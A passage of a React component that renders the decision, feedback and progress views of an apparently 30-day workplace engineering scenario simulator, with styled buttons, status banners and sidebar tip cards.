                            style={{ marginTop: "3px", accentColor: "#2563eb", width: "18px", height: "18px", cursor: "pointer" }}
                          />
                          <span style={{ fontSize: "14px", color: isSelected ? "#1e40af" : "var(--text-color)", fontWeight: isSelected ? 600 : 400, lineHeight: "1.5", flex: 1 }}>
                            {option.text}
                          </span>
                        </div>
                      );
                    })}
                  </div>

                  {/* Submit Button */}
                  <button
                    onClick={handleSubmitDecision}
                    className="btn btn-primary"
                    style={{
                      width: "100%",
                      padding: "14px",
                      borderRadius: "10px",
                      fontSize: "15px",
                      fontWeight: "700",
                      marginTop: "8px",
                      boxShadow: "0 4px 12px rgba(37, 99, 235, 0.2)"
                    }}
                  >
                    Submit Decision &rarr;
                  </button>
                </div>
              ) : (
                /* IF COMPLETED: Feedback view */
                <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
                  
                  {/* Status Banner */}
                  <div style={{
                    padding: "16px 20px",
                    borderRadius: "12px",
                    backgroundColor: chosenOption?.isCorrect ? "#f0fdf4" : chosenOption?.feedbackType === "warning" ? "#fffbeb" : "#fef2f2",
                    border: "1px solid",
                    borderColor: chosenOption?.isCorrect ? "#86efac" : chosenOption?.feedbackType === "warning" ? "#fde68a" : "#fca5a5",
                    display: "flex",
                    alignItems: "center",
                    gap: "12px"
                  }}>
                    {chosenOption?.isCorrect ? <CheckCircle2 size={24} color="#16a34a" /> : chosenOption?.feedbackType === "warning" ? <AlertTriangle size={24} color="#d97706" /> : <XCircle size={24} color="#dc2626" />}
                    <div>
                      <h4 style={{
                        margin: 0,
                        fontSize: "16px",
                        fontWeight: "800",
                        color: chosenOption?.isCorrect ? "#15803d" : chosenOption?.feedbackType === "warning" ? "#b45309" : "#b91c1c"
                      }}>
                        {chosenOption?.feedbackTitle || "DECISION SUBMITTED"}
                      </h4>
                      <p style={{ margin: "2px 0 0 0", fontSize: "13px", color: "var(--text-muted)" }}>
                        Your decision has been logged for Day {selectedDay}.
                      </p>
                    </div>
                  </div>

                  {/* WHAT HAPPENED & WHY Box */}
                  <div style={{
                    backgroundColor: "var(--bg-light)",
                    border: "1px solid var(--border-color)",
                    borderRadius: "12px",
                    padding: "20px 24px"
                  }}>
                    <h4 style={{
                      margin: "0 0 10px 0",
                      fontSize: "12px",
                      fontWeight: "800",
                      color: "var(--text-dark)",
                      textTransform: "uppercase",
                      letterSpacing: "1px",
                      display: "flex",
                      alignItems: "center",
                      gap: "6px"
                    }}>
                      <Lightbulb size={16} color="#eab308" /> WHAT HAPPENED & WHY
                    </h4>
                    <div style={{ whiteSpace: "pre-line", fontSize: "14px", color: "var(--text-dark)", lineHeight: "1.7", fontWeight: 400 }}>
                      {chosenOption?.explanation}
                    </div>
                  </div>

                  {/* Completion Action Box */}
                  <div style={{
                    backgroundColor: "linear-gradient(to right, #f8fafc, #f1f5f9)",
                    borderRadius: "12px",
                    padding: "20px",
                    textAlign: "center",
                    border: "1px solid var(--border-color)",
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    gap: "12px"
                  }}>
                    <div style={{ display: "flex", alignItems: "center", gap: "8px", color: "#16a34a", fontWeight: "700", fontSize: "15px" }}>
                      <CheckCircle size={20} /> Day {selectedDay} Simulation Complete
                    </div>
                    
                    <div style={{ display: "flex", gap: "12px", flexWrap: "wrap", justifyContent: "center" }}>
                      {onBackToDashboard && (
                        <button
                          onClick={onBackToDashboard}
                          className="btn btn-secondary"
                          style={{ padding: "10px 20px", borderRadius: "8px", fontWeight: "600" }}
                        >
                          Return to Dashboard
                        </button>
                      )}

                      {selectedDay < 30 && (
                        <button
                          onClick={() => handleSelectDay(selectedDay + 1)}
                          className="btn btn-primary"
                          style={{ padding: "10px 24px", borderRadius: "8px", fontWeight: "600" }}
                        >
                          Next Day Scenario &rarr;
                        </button>
                      )}
                    </div>
                  </div>

                </div>
              )}

            </div>
          )}

        </div>

        {/* Right Column: Sidebar Stats & Guidance */}
        <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
          
          {/* Simulation Progress Card */}
          <div className="card" style={{ padding: "20px" }}>
            <h4 style={{ fontSize: "15px", fontWeight: "bold", color: "var(--text-dark)", margin: "0 0 16px 0", display: "flex", alignItems: "center", gap: "8px" }}>
              <TrendingUp size={18} color="#3b82f6" /> Simulation Progress
            </h4>
            
            <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
              <div>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: "13px", fontWeight: "600", marginBottom: "6px" }}>
                  <span>Completed Scenarios</span>
                  <span style={{ color: "#2563eb" }}>{completedCount} / 30</span>
                </div>
                <div style={{ height: "8px", width: "100%", background: "#f1f5f9", borderRadius: "4px", overflow: "hidden" }}>
                  <div style={{ height: "100%", width: `${(completedCount / 30) * 100}%`, background: "linear-gradient(to right, #3b82f6, #6366f1)", borderRadius: "4px" }}></div>
                </div>
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px", marginTop: "4px" }}>
                <div style={{ background: "#f8fafc", padding: "12px", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
                  <div style={{ fontSize: "11px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: "700" }}>Current Day</div>
                  <div style={{ fontSize: "18px", fontWeight: "800", color: "#0f172a", marginTop: "2px" }}>Day {selectedDay}</div>
                </div>
                <div style={{ background: "#f8fafc", padding: "12px", borderRadius: "8px", border: "1px solid #e2e8f0" }}>
                  <div style={{ fontSize: "11px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: "700" }}>Streak</div>
                  <div style={{ fontSize: "18px", fontWeight: "800", color: "#16a34a", marginTop: "2px" }}>{completedCount} Days</div>
                </div>
              </div>
            </div>
          </div>

          {/* Guidance Card */}
          <div className="card" style={{ padding: "20px", background: "#f0fdf4", border: "1px solid #bbf7d0" }}>
            <h4 style={{ margin: "0 0 10px 0", color: "#15803d", fontSize: "14px", fontWeight: "700", display: "flex", alignItems: "center", gap: "8px" }}>
              <Lightbulb size={18} /> Workplace Engineering Tip
            </h4>
            <p style={{ margin: 0, fontSize: "13px", color: "#166534", lineHeight: "1.6" }}>
              Real-world engineering decisions involve trade-offs between speed, maintainability, and user experience. Always evaluate long-term impacts before writing code.
            </p>
          </div>

          {/* Rules & Guidelines Card */}
          <div className="card" style={{ padding: "20px", background: "#fffbeb", border: "1px solid #fde68a" }}>
            <h4 style={{ margin: "0 0 12px 0", color: "#b45309", fontSize: "14px", fontWeight: "700", display: "flex", alignItems: "center", gap: "8px" }}>
              <ShieldAlert size={18} color="#b45309" /> Simulation Rules
            </h4>
            <ul style={{ margin: 0, paddingLeft: "18px", color: "#92400e", fontSize: "13px", lineHeight: "1.6" }}>
              <li><b>Daily Rhythm:</b> 1 scenario unlocks per day at 12:00 AM Midnight.</li>
              <li><b>Instant Feedback:</b> Detailed explanation follows every submitted decision.</li>
              <li><b>Impact:</b> Choices shape the scenario context for upcoming days.</li>
            </ul>
          </div>


        </div>

      </div>

    </div>
  );
}
